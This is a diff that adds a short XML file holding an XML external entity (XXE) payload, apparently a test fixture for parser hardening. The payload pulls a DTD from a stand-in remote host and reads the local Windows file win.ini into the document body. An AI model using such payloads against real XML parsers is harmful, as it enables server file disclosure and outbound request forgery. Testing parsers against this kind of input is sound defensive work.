@@ -1,0 +1,6 @@
+<!DOCTYPE study [
+  <!ENTITY % remote SYSTEM "https://example.invalid/remote.dtd">
+  %remote;
+  <!ENTITY local SYSTEM "file:///C:/Windows/win.ini">
+]>
+<study>&local;</study>
